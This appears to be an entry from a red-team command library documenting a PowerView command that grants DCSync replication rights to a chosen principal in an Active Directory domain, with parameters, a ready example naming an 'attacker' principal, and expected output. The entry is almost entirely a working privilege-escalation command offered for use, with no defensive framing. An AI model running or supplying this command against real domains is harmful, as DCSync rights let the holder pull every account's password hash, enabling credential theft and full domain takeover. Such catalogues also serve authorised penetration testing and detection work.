---
id: 9b62eb9b-123c-4268-a595-d73b8d2b0fae
name: powerview-add-dcsync-rights
type: command
executor: powershell
data: >-
  Add-DomainObjectAcl -Rights DCSync -TargetDomain $_DOMAIN -PrincipalIdentity
  $_TARGET_PRINCIPAL -Credential $Cred
output: >
  PS C:\> Add-DomainObjectAcl -Rights DCSync -TargetDomain bank.local
  -PrincipalIdentity service -Credential $Cred
created_at: '2020-03-16T00:35:46.225770+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - powerview
  - dcsync
verified: true
validated: true
---

# powerview-add-dcsync-rights

## Command

```powershell
Add-DomainObjectAcl -Rights DCSync -TargetDomain $_DOMAIN -PrincipalIdentity $_TARGET_PRINCIPAL -Credential $Cred
```

## Description

Adds DCSync replication rights to a principal via ACL modification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Rights DCSync | Specific right | Yes |
| -TargetDomain $_DOMAIN | Domain | Yes |
| -PrincipalIdentity $_TARGET_PRINCIPAL | User/service | Yes |
| -Credential $Cred | Creds | If needed |

## Examples

### Basic Usage

```powershell
Add-DomainObjectAcl -Rights DCSync -TargetDomain contoso.com -PrincipalIdentity attacker
```

## Expected Output

ACL modified successfully.

## Related

- [[procedures/Add-DCSync-Rights-via-WriteDACL-Permissions]]
